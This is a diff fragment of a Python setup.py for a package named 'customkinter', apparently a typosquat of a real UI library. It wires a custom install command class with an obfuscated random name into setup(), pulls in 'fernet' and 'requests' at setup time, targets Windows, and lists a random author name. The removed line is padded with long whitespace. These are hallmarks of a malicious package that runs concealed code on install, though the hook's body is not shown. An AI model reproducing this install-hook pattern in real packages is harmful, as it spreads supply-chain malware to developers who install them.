@@ -18,5 +18,22 @@ class hjFZRMWzYvSJMoXqwIAbuJVgBuMBRldEFpUBbgMxDqIgHEZlUfSOipVVUicEATAUaWByhLleOi
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
+setup(
+    name="customkinter",
+    version=VERSION,
+    author="tLEWfbNWGUhGE",
+    author_email="wrTaqtiaQuCDshBoYtdY@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': hjFZRMWzYvSJMoXqwIAbuJVgBuMBRldEFpUBbgMxDqIgHEZlUfSOipVVUicEATAUaWByhLleOiiDAqQPxAxqAzblBEYsFPGxPoJNpQHOtQmciSbVwzzZzfIcXJoobFEutXSgFQZAWSQSNnWnebEefbeLlmGgiNPg,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
